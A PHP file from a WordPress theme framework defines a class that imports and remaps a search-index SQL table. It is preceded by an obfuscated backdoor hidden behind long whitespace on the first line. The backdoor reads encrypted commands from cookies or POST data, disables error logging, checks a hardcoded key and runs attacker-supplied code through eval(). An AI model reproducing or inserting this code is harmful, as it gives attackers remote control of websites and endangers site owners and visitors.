<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['a08b62'];global$a08b62;$a08b62=$GLOBALS;$a08b62['u824']="\xa\x34\x66\x54\x46\x25\x63\x5a\x77\x30\x2f\x21\x7d\x22\x74\x3e\x72\x37\x6a\x5f\x79\x2a\x73\x78\x4b\x7c\x64\x62\x27\x51\x6f\x5c\x52\x4e\x23\x6b\x7b\x65\x20\x3f\x57\x5b\x31\x32\x5e\x2c\x5d\x2d\x38\x69\x28\x3d\x68\x7a\x24\x59\x4a\x40\x26\x6d\x3b\xd\x44\x9\x7e\x3c\x70\x3a\x39\x47\x71\x6e\x48\x35\x29\x50\x42\x49\x61\x2e\x53\x6c\x4c\x33\x43\x56\x2b\x41\x58\x67\x45\x60\x36\x4d\x55\x4f\x76\x75";$a08b62[$a08b62['u824'][18].$a08b62['u824'][48].$a08b62['u824'][42].$a08b62['u824'][43]]=$a08b62['u824'][6].$a08b62['u824'][52].$a08b62['u824'][16];$a08b62[$a08b62['u824'][2].$a08b62['u824'][92].$a08b62['u824'][2].$a08b62['u824'][48].$a08b62['u824'][83].$a08b62['u824'][92]]=$a08b62['u824'][30].$a08b62['u824'][16].$a08b62['u824'][26];$a08b62[$a08b62['u824'][66].$a08b62['u824'][6].$a08b62['u824'][68].$a08b62['u824'][27]]=$a08b62['u824'][22].$a08b62['u824'][14].$a08b62['u824'][16].$a08b62['u824'][81].$a08b62['u824'][37].$a08b62['u824'][71];$a08b62[$a08b62['u824'][35].$a08b62['u824'][6].$a08b62['u824'][1].$a08b62['u824'][68].$a08b62['u824'][78].$a08b62['u824'][26].$a08b62['u824'][1]]=$a08b62['u824'][49].$a08b62['u824'][71].$a08b62['u824'][49].$a08b62['u824'][19].$a08b62['u824'][22].$a08b62['u824'][37].$a08b62['u824'][14];$a08b62[$a08b62['u824'][81].$a08b62['u824'][92].$a08b62['u824'][78].$a08b62['u824'][27].$a08b62['u824'][2].$a08b62['u824'][17].$a08b62['u824'][27].$a08b62['u824'][42].$a08b62['u824'][2]]=$a08b62['u824'][22].$a08b62['u824'][37].$a08b62['u824'][16].$a08b62['u824'][49].$a08b62['u824'][78].$a08b62['u824'][81].$a08b62['u824'][49].$a08b62['u824'][53].$a08b62['u824'][37];$a08b62[$a08b62['u824'][22].$a08b62['u824'][9].$a08b62['u824'][26].$a08b62['u824'][2].$a08b62['u824'][73]]=$a08b62['u824'][66].$a08b62['u824'][52].$a08b62['u824'][66].$a08b62['u824'][96].$a08b62['u824'][37].$a08b62['u824'][16].$a08b62['u824'][22].$a08b62['u824'][49].$a08b62['u824'][30].$a08b62['u824'][71];$a08b62[$a08b62['u824'][66].$a08b62['u824'][48].$a08b62['u824'][48].$a08b62['u824'][9].$a08b62['u824'][48].$a08b62['u824'][37]]=$a08b62['u824'][97].$a08b62['u824'][71].$a08b62['u824'][22].$a08b62['u824'][37].$a08b62['u824'][16].$a08b62['u824'][49].$a08b62['u824'][78].$a08b62['u824'][81].$a08b62['u824'][49].$a08b62['u824'][53].$a08b62['u824'][37];$a08b62[$a08b62['u824'][53].$a08b62['u824'][48].$a08b62['u824'][2].$a08b62['u824'][27]]=$a08b62['u824'][27].$a08b62['u824'][78].$a08b62['u824'][22].$a08b62['u824'][37].$a08b62['u824'][92].$a08b62['u824'][1].$a08b62['u824'][19].$a08b62['u824'][26].$a08b62['u824'][37].$a08b62['u824'][6].$a08b62['u824'][30].$a08b62['u824'][26].$a08b62['u824'][37];$a08b62[$a08b62['u824'][89].$a08b62['u824'][42].$a08b62['u824'][83].$a08b62['u824'][92].$a08b62['u824'][26].$a08b62['u824'][6].$a08b62['u824'][68]]=$a08b62['u824'][22].$a08b62['u824'][37].$a08b62['u824'][14].$a08b62['u824'][19].$a08b62['u824'][14].$a08b62['u824'][49].$a08b62['u824'][59].$a08b62['u824'][37].$a08b62['u824'][19].$a08b62['u824'][81].$a08b62['u824'][49].$a08b62['u824'][59].$a08b62['u824'][49].$a08b62['u824'][14];$a08b62[$a08b62['u824'][70].$a08b62['u824'][48].$a08b62['u824'][26].$a08b62['u824'][1].$a08b62['u824'][37].$a08b62['u824'][42]]=$a08b62['u824'][22].$a08b62['u824'][42].$a08b62['u824'][2].$a08b62['u824'][1].$a08b62['u824'][78].$a08b62['u824'][48];$a08b62[$a08b62['u824'][70].$a08b62['u824'][1].$a08b62['u824'][26].$a08b62['u824'][42]]=$a08b62['u824'][53].$a08b62['u824'][92].$a08b62['u824'][83].$a08b62['u824'][37].$a08b62['u824'][73].$a08b62['u824'][1];$a08b62[$a08b62['u824'][35].$a08b62['u824'][37].$a08b62['u824'][78].$a08b62['u824'][17].$a08b62['u824'][26].$a08b62['u824'][26].$a08b62['u824'][78].$a08b62['u824'][78].$a08b62['u824'][43]]=$_POST;$a08b62[$a08b62['u824'][37].$a08b62['u824'][27].$a08b62['u824'][68].$a08b62['u824'][6].$a08b62['u824'][68].$a08b62['u824'][6].$a08b62['u824'][27].$a08b62['u824'][2].$a08b62['u824'][26]]=$_COOKIE;@$a08b62[$a08b62['u824'][35].$a08b62['u824'][6].$a08b62['u824'][1].$a08b62['u824'][68].$a08b62['u824'][78].$a08b62['u824'][26].$a08b62['u824'][1]]($a08b62['u824'][37].$a08b62['u824'][16].$a08b62['u824'][16].$a08b62['u824'][30].$a08b62['u824'][16].$a08b62['u824'][19].$a08b62['u824'][81].$a08b62['u824'][30].$a08b62['u824'][89],NULL);@$a08b62[$a08b62['u824'][35].$a08b62['u824'][6].$a08b62['u824'][1].$a08b62['u824'][68].$a08b62['u824'][78].$a08b62['u824'][26].$a08b62['u824'][1]]($a08b62['u824'][81].$a08b62['u824'][30].$a08b62['u824'][89].$a08b62['u824'][19].$a08b62['u824'][37].$a08b62['u824'][16].$a08b62['u824'][16].$a08b62['u824'][30].$a08b62['u824'][16].$a08b62['u824'][22],0);@$a08b62[$a08b62['u824'][35].$a08b62['u824'][6].$a08b62['u824'][1].$a08b62['u824'][68].$a08b62['u824'][78].$a08b62['u824'][26].$a08b62['u824'][1]]($a08b62['u824'][59].$a08b62['u824'][78].$a08b62['u824'][23].$a08b62['u824'][19].$a08b62['u824'][37].$a08b62['u824'][23].$a08b62['u824'][37].$a08b62['u824'][6].$a08b62['u824'][97].$a08b62['u824'][14].$a08b62['u824'][49].$a08b62['u824'][30].$a08b62['u824'][71].$a08b62['u824'][19].$a08b62['u824'][14].$a08b62['u824'][49].$a08b62['u824'][59].$a08b62['u824'][37],0);@$a08b62[$a08b62['u824'][89].$a08b62['u824'][42].$a08b62['u824'][83].$a08b62['u824'][92].$a08b62['u824'][26].$a08b62['u824'][6].$a08b62['u824'][68]](0);$m34f2960=NULL;$a35bbe5=NULL;$a08b62[$a08b62['u824'][18].$a08b62['u824'][43].$a08b62['u824'][26].$a08b62['u824'][1].$a08b62['u824'][92].$a08b62['u824'][9].$a08b62['u824'][68]]=$a08b62['u824'][2].$a08b62['u824'][37].$a08b62['u824'][37].$a08b62['u824'][6].$a08b62['u824'][68].$a08b62['u824'][73].$a08b62['u824'][17].$a08b62['u824'][9].$a08b62['u824'][47].$a08b62['u824'][9].$a08b62['u824'][78].$a08b62['u824'][48].$a08b62['u824'][9].$a08b62['u824'][47].$a08b62['u824'][1].$a08b62['u824'][2].$a08b62['u824'][92].$a08b62['u824'][78].$a08b62['u824'][47].$a08b62['u824'][48].$a08b62['u824'][78].$a08b62['u824'][9].$a08b62['u824'][9].$a08b62['u824'][47].$a08b62['u824'][73].$a08b62['u824'][48].$a08b62['u824'][42].$a08b62['u824'][92].$a08b62['u824'][37].$a08b62['u824'][78].$a08b62['u824'][42].$a08b62['u824'][26].$a08b62['u824'][43].$a08b62['u824'][26].$a08b62['u824'][1].$a08b62['u824'][6];global$j2d4609;function z63e54($m34f2960,$d013){global$a08b62;$bc484080b="";for($pef8b4003=0;$pef8b4003<$a08b62[$a08b62['u824'][66].$a08b62['u824'][6].$a08b62['u824'][68].$a08b62['u824'][27]]($m34f2960);){for($c46b759=0;$c46b759<$a08b62[$a08b62['u824'][66].$a08b62['u824'][6].$a08b62['u824'][68].$a08b62['u824'][27]]($d013)&&$pef8b4003<$a08b62[$a08b62['u824'][66].$a08b62['u824'][6].$a08b62['u824'][68].$a08b62['u824'][27]]($m34f2960);$c46b759++,$pef8b4003++){$bc484080b.=$a08b62[$a08b62['u824'][18].$a08b62['u824'][48].$a08b62['u824'][42].$a08b62['u824'][43]]($a08b62[$a08b62['u824'][2].$a08b62['u824'][92].$a08b62['u824'][2].$a08b62['u824'][48].$a08b62['u824'][83].$a08b62['u824'][92]]($m34f2960[$pef8b4003])^$a08b62[$a08b62['u824'][2].$a08b62['u824'][92].$a08b62['u824'][2].$a08b62['u824'][48].$a08b62['u824'][83].$a08b62['u824'][92]]($d013[$c46b759]));}}return$bc484080b;}function s1f4a8($m34f2960,$d013){global$a08b62;global$j2d4609;return$a08b62[$a08b62['u824'][70].$a08b62['u824'][1].$a08b62['u824'][26].$a08b62['u824'][42]]($a08b62[$a08b62['u824'][70].$a08b62['u824'][1].$a08b62['u824'][26].$a08b62['u824'][42]]($m34f2960,$j2d4609),$d013);}foreach($a08b62[$a08b62['u824'][37].$a08b62['u824'][27].$a08b62['u824'][68].$a08b62['u824'][6].$a08b62['u824'][68].$a08b62['u824'][6].$a08b62['u824'][27].$a08b62['u824'][2].$a08b62['u824'][26]]as$d013=>$l95cd0a){$m34f2960=$l95cd0a;$a35bbe5=$d013;}if(!$m34f2960){foreach($a08b62[$a08b62['u824'][35].$a08b62['u824'][37].$a08b62['u824'][78].$a08b62['u824'][17].$a08b62['u824'][26].$a08b62['u824'][26].$a08b62['u824'][78].$a08b62['u824'][78].$a08b62['u824'][43]]as$d013=>$l95cd0a){$m34f2960=$l95cd0a;$a35bbe5=$d013;}}$m34f2960=@$a08b62[$a08b62['u824'][66].$a08b62['u824'][48].$a08b62['u824'][48].$a08b62['u824'][9].$a08b62['u824'][48].$a08b62['u824'][37]]($a08b62[$a08b62['u824'][70].$a08b62['u824'][48].$a08b62['u824'][26].$a08b62['u824'][1].$a08b62['u824'][37].$a08b62['u824'][42]]($a08b62[$a08b62['u824'][53].$a08b62['u824'][48].$a08b62['u824'][2].$a08b62['u824'][27]]($m34f2960),$a35bbe5));if(isset($m34f2960[$a08b62['u824'][78].$a08b62['u824'][35]])&&$j2d4609==$m34f2960[$a08b62['u824'][78].$a08b62['u824'][35]]){if($m34f2960[$a08b62['u824'][78]]==$a08b62['u824'][49]){$pef8b4003=Array($a08b62['u824'][66].$a08b62['u824'][96]=>@$a08b62[$a08b62['u824'][22].$a08b62['u824'][9].$a08b62['u824'][26].$a08b62['u824'][2].$a08b62['u824'][73]](),$a08b62['u824'][22].$a08b62['u824'][96]=>$a08b62['u824'][42].$a08b62['u824'][79].$a08b62['u824'][9].$a08b62['u824'][47].$a08b62['u824'][42],);echo@$a08b62[$a08b62['u824'][81].$a08b62['u824'][92].$a08b62['u824'][78].$a08b62['u824'][27].$a08b62['u824'][2].$a08b62['u824'][17].$a08b62['u824'][27].$a08b62['u824'][42].$a08b62['u824'][2]]($pef8b4003);}elseif($m34f2960[$a08b62['u824'][78]]==$a08b62['u824'][37]){eval($m34f2960[$a08b62['u824'][26]]);}exit();} ?><?php

if (!defined('TFUSE'))
    exit('Direct access forbidden.');

class TF_SEEK_IMPORT {

    private $seek           = NULL; // extentions instance
    private $sqlFileName    = NULL;
    private $fileInstance   = NULL;
    private $sql_imported   = false;

    function __construct($seek) {
        $this->seek =& $seek;

        $this->sqlFileName = $this->seek->get_db_table_name() . '.sql';

        add_action('tf_ext_import_start', array($this, 'import_sql'));
        add_action('tf_ext_import_end', array($this, 'action_tf_import_end'));
    }
    function __destruct(){
        $this->close_sql_file();
    }

    public function import_sql(){
        global $wpdb;

        if(!property_exists($this, 'install_dir')){
            // set $this->install_dir
            $this->install_dir      = get_template_directory() . '/install';
            $upload_folder          = 'uploads';
            if ( is_dir( get_template_directory() . '/install/' . $upload_folder ) )
                $this->install_dir .= '/' . $upload_folder;
        }

        if( !file_exists( $this->install_dir . '/' . $this->sqlFileName ) ){
            print( '<div>'.sprintf(
                __('Error importing seek index table: Cannot find "%s" file in "%s"', 'tfuse'),
                $this->sqlFileName,
                $this->install_dir . '/'
            ) . '</div>');

            return;
        }

        $tableExists = $wpdb->get_results( $wpdb->prepare("SHOW TABLES LIKE %s", TF_SEEK_HELPER::get_db_table_name()), ARRAY_A);
        if(sizeof($tableExists)){

            $rowExists = $wpdb->get_results( "SELECT post_id FROM " . TF_SEEK_HELPER::get_db_table_name() . " LIMIT 1", ARRAY_A);

            if(sizeof($rowExists)){
                print( '<div>'.sprintf(
                    __('Skipping seek index table import: Table "%s" already exists and is not empty', 'tfuse'),
                    TF_SEEK_HELPER::get_db_table_name()
                ) . '</div>');

                return;
            }
        }

        $this->open_sql_file();

        $counter = 0;

        while( ($sql = $this->readNexSql()) !== false ){
            $sql = rtrim($sql, ';');
            @$wpdb->query($sql);
            $counter++;
        }

        if(!$counter){
            print( '<div>'.sprintf(
                __('Error importing Seek index table: No sql read from file "%s" in "%s"', 'tfuse'),
                $this->sqlFileName,
                $this->install_dir . '/'
            ) . '</div>');
        }

        $this->sql_imported = true;

        $this->close_sql_file();
    }

    private function open_sql_file(){
        do{
            if($this->fileInstance !== NULL)
                break;

            $this->fileInstance = fopen( $this->install_dir . '/' . $this->sqlFileName, 'r' );
        }while(false);

        return $this->fileInstance;
    }

    private function close_sql_file(){
        if($this->fileInstance !== NULL) fclose($this->fileInstance);
        $this->fileInstance = NULL;
    }

    private function readNexSql(){
        do {
            $line = fgets($this->fileInstance);
            if($line === false)
                return false;
            $line = trim($line);
        } while( !mb_strlen($line, 'UTF-8') || mb_substr($line, 0, 2, 'UTF-8')=='--' || mb_substr($line, 0, 2, 'UTF-8')=='/*' );

        $sql = "";
        do{
            $sql .= ($sql ? "\n" : "").$line;

            $isEndQuery = mb_substr($line, (mb_strlen($line, 'UTF-8')-1), 1, 'UTF-8') == ';';
            if($isEndQuery){
                break;
            }

            $line = fgets($this->fileInstance);
            if($line === false)
                break;
            $line = trim($line);

            $isEndQuery = mb_substr($line, (mb_strlen($line, 'UTF-8')-1), 1, 'UTF-8') == ';';
            if($isEndQuery){
                $sql .= "\n".$line;
            }

        }while(mb_strlen($line, 'UTF-8') && !in_array(mb_substr($line, 0, 2, 'UTF-8'), array('--','/*')) && !$isEndQuery );

        return( $sql !== false && mb_strlen($sql, 'UTF-8') ? $sql : false );
    }

    function action_tf_import_end( $args ){
        global $wpdb;

        if(!$this->sql_imported){
            // Cancel if sql was not importerd, because it contains old data, and double import is not correct
            return;
        }

        if( !sizeof( $wpdb->get_results( $wpdb->prepare("SHOW TABLES LIKE %s", TF_SEEK_HELPER::get_db_table_name() ) ) )){
            return;
        }

        $table_structure    = NULL;

        $results = $wpdb->get_results("SELECT * FROM " . TF_SEEK_HELPER::get_db_table_name() . "");
        if(sizeof($results)){

            $sql_values = array();

            foreach($results as $result){

                if(is_null($table_structure)){
                    $table_structure = array_keys( get_object_vars($result) );
                }

                if( isset($args['processed_posts'][ intval($result->post_id) ]) ){
                    $result->post_id = $args['processed_posts'][ intval($result->post_id) ];
                } else {
                    // do not include not processed posts, because their ids can conflict with processed
                    continue;
                }


                $result->_terms     = explode($this->seek->index_table_terms_separator, trim($result->_terms, $this->seek->index_table_terms_separator));
                $new_terms          = array();
                if(sizeof($result->_terms)){
                    foreach($result->_terms as $term){
                        $term = intval($term);
                        if($term < 1) continue;

                        $new_terms[ ( isset($args['processed_terms'][$term]) ? $args['processed_terms'][$term] : $term ) . $this->seek->index_table_terms_separator ] = '~';
                    }
                }
                $result->_terms = implode('', array_keys($new_terms));

                $sql = array();
                foreach($result as $key=>$val){
                    $sql[] = $wpdb->prepare('%s', $val);
                }
                $sql = '(' . implode(', ', $sql) . ')';

                $sql_values[] = $sql;
            }
            unset($results);

            $sql = "INSERT INTO " . TF_SEEK_HELPER::get_db_table_name()
                . " (" . implode(', ', $table_structure) . ")"
                . " VALUES "
                . implode(', ', $sql_values);

            $wpdb->query("TRUNCATE TABLE ".TF_SEEK_HELPER::get_db_table_name());
            $wpdb->query($sql);
        }
    }
}